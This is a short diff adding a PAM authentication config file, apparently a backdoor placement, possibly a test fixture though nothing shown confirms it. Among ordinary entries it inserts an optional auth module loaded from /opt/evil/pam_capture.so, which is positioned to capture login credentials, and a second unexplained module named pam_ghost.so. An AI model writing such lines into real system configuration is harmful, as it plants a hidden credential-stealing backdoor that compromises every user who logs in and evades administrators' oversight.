@@ -1,0 +1,5 @@
+@include common-auth
+account    required     pam_nologin.so
+session    required     pam_limits.so
+auth       optional     /opt/evil/pam_capture.so
+auth       optional     pam_ghost.so
